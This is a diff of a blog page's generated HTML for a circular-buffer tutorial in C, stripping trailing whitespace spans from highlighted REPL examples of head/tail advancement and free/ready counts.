-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">false</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">false</span>
 </code></pre></div>
 
-<p>If we move the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> to the end we will reach again to the ambiguous cases but the <code><span class="highlight-candombe-inline"><span class="n">hbehind</span><span class="w"></span></span></code> variable tell us that the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> is behind the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> again:</p>
+<p>If we move the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> to the end we will reach again to the ambiguous cases but the <code><span class="highlight-candombe-inline"><span class="n">hbehind</span></span></code> variable tell us that the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> is behind the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> again:</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_0_0_full.png' /></figure></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">16</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">16</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 </code></pre></div>
 
 <h3 id="final-bits">Final bits</h3>
 <p>Finally, do not forget to destroy the buffer:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
 </code></pre></div>
 
 <script src="https://utteranc.es/client.js"
